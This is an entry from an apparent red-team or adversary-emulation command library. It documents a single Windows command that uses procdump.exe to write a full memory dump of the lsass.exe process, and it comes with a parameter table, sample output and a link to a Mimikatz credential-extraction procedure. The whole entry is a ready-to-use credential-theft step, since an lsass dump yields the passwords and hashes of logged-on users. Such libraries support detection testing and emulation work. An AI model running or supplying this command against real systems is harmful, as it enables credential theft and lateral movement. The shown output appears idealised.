---
id: a136575a-3c18-499e-993e-314feb076876
name: create-lsass-dump-http
type: command
executor: cmd
data: 'C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp'
output: null
created_at: '2023-04-06T03:56:27.176985+00:00'
updated_at: '2023-04-10T20:37:14.787792+00:00'
platforms:
  - Windows
tags:
  - dump
  - lsass
  - memory
verified: true
validated: true
---

# create-lsass-dump-http

## Command

```cmd
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

## Description

Creates a full memory dump of the lsass.exe process using the locally downloaded procdump.exe tool.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -accepteula | Automatically accepts the EULA | Yes |
| -ma | Creates a full mini dump (all accessible memory) | Yes |
| lsass.exe | Target process name | Yes |
| lsass.dmp | Output dump file name | Yes |

## Examples

### Basic Usage

```cmd
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

## Expected Output

```
Procdump v10.1 - Sysinternals - www.sysinternals.com

Procdump is part of Sysinternals utilities.

Copyright (C) 2008-2016 Mark Russinovich and Sysinternals

Processes: lsass.exe (1234)

Dump file: lsass.dmp (145 MB)

[Dump completed successfully]
```

## Related

- [[procedures/windows-lsass-mini-dump-for-mimikatz]]
